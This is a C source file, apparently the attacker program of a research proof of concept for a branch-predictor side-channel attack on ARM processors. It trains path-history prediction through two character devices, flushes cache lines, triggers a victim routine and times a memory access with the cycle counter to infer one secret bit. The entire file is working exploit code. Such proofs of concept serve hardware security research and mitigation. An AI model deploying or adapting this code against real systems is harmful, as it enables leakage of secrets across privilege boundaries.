#include "Attacker_rsa.h"
#include "Victim.h"
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include <fcntl.h>
#include <unistd.h>
#include "evict_set.h"

unsigned char attacker_array[Cache_Line];
int len_array[Cache_Line];
int times, shift;
char mark;

#define min(x, y) (x) < (y) ? (x) : (y)
#ifndef REPT_TIMES
#define REPT_TIMES 22
#endif

cache_ctx_t evict_set_for_attacker_array = NULL;
cache_ctx_t evict_set_for_len_array = NULL;
extern Elem** evsets;

int PHR_Flush(int fd, int shift) {
    int i = 0;
    volatile int temp = 3;
    char s[10] = "notaffect";

    //for (int j = 0; j < PHR_LEN*8; j++) j += (j+1)/(j+1)-1;
    temp+=read(fd, s, 9);
    asm volatile("isb\n");
    asm volatile("dmb sy\n");
    
	asm volatile (
		".rept %[rept_times]\n"
		"b 1f\n"
		"nop\n"
		"1:\n"
		"add %[rr], %[rr1], 1\n"
		"nop\n"
		".endr\n"
		:[rr]"=r"(i)
		:[rept_times]"i"(REPT_TIMES), [rr1]"r"(i)
	);
    
    i = shift;

    temp += (temp+1)/(temp+1)-1;
    temp += (temp+1)/(temp+1)-1;
    temp += (temp+1)/(temp+1)-1;
    asm volatile("isb\n");
    asm volatile("dsb sy\n");
    if (i < len_array[0])
    	temp += attacker_array[0];
    return temp;
}

int main(int argc, char* argv[]) {
	// prepare evict set
    evict_set_for_attacker_array = evsets_prepare((char*)attacker_array);
    evict_set_for_len_array = evsets_prepare((char*)len_array);

    unsigned char temp;
	uint64_t begin, end;
    volatile int tmp = 0;
    int fd0 = open("/dev/mychardev-0", O_RDWR), fd1 = open("/dev/mychardev-1", O_RDWR);
    int offset = 0;
    times = 0;
    char train_buf[30];
    clock_t start_time, end_time;
    double elapsed_time;
    start_time = clock(); 
    if(argc == 2)
        offset = atoi(argv[1]);
    else offset = 24;
 
    shift = PHR_LEN-offset-2;
    attacker_array[0] = 0x22;
    for (int k = 0; k < ATK_ROUNDS; k++) {
	// train 1
	len_array[0] = PHR_LEN+10;
	
	train_buf[2] = 0x00;
	train_buf[1] = 0x36;
	train_buf[0] = 0xa3;
	write(fd0, train_buf, 3);
	for (int j = 0; j < PHR_TRAIN_ROUNDS; j++) {
		tmp+=PHR_Flush(fd0, shift);
		tmp+=(tmp+1)/(tmp+1)-1;
		tmp+=(tmp+1)/(tmp+1)-1;
		tmp+=(tmp+1)/(tmp+1)-1;
		asm volatile("dsb sy\n");
		asm volatile("isb\n");
	}
	// train 0
	len_array[0] = shift;

	train_buf[2] = 0x00;
	train_buf[1] = 0x16;
	train_buf[0] = 0x23;
	write(fd0, train_buf, 3);
	for (int j = 0; j < PHR_TRAIN_ROUNDS; j++) {
                tmp+=PHR_Flush(fd0, shift);
                tmp+=(tmp+1)/(tmp+1)-1;
                tmp+=(tmp+1)/(tmp+1)-1;
                tmp+=(tmp+1)/(tmp+1)-1;
                asm volatile("dsb sy\n");
                asm volatile("isb\n");
	}
	// attacker retrieve
	asm volatile("DC CIVAC, %[ad]" : : [ad] "r" (attacker_array));
	asm volatile("DC CIVAC, %[ad]" : : [ad] "r" (attacker_array));
	asm volatile("DC CIVAC, %[ad]" : : [ad] "r" (attacker_array));
	asm volatile("DC CIVAC, %[ad]" : : [ad] "r" (attacker_array));
	asm volatile("DC CIVAC, %[ad]" : : [ad] "r" (attacker_array));
	asm volatile("DC CIVAC, %[ad]" : : [ad] "r" (len_array));
	asm volatile("DC CIVAC, %[ad]" : : [ad] "r" (len_array));
	asm volatile("DC CIVAC, %[ad]" : : [ad] "r" (len_array));
	asm volatile("DC CIVAC, %[ad]" : : [ad] "r" (len_array));
	asm volatile("DC CIVAC, %[ad]" : : [ad] "r" (len_array));

	// trigger victim
	tmp+=PHR_Flush(fd1, shift);
	unsigned char temp;
	// check cache hit?
	asm volatile (
		"isb \n"
		"dsb sy\n"
		"mrs %[times], PMCCNTR_EL0\n"
		:[times]"=&r"(begin)
		::
	);
	temp = *(unsigned char*)(attacker_array);
	asm volatile (
		"isb \n"
		"dsb sy\n"
		"mrs %[times], PMCCNTR_EL0\n"
		:[times]"=&r"(end)
		::
	);
	times += (end-begin) <= HIT_THRESHOLD;
    }
	mark = times >= TIMES_THRESHOLD;
	if(mark) {
		printf("confidence [%d] hit at: %d, means secret equals 1\n", times, shift);
	} else {
		printf("confidence [%d] hit at: %d, means secret equals 0\n", times, shift);
	}
	end_time = clock();
	elapsed_time = (double)(end_time-start_time) / CLOCKS_PER_SEC * 1000000;
	printf("running time: %f us\n", elapsed_time);
}
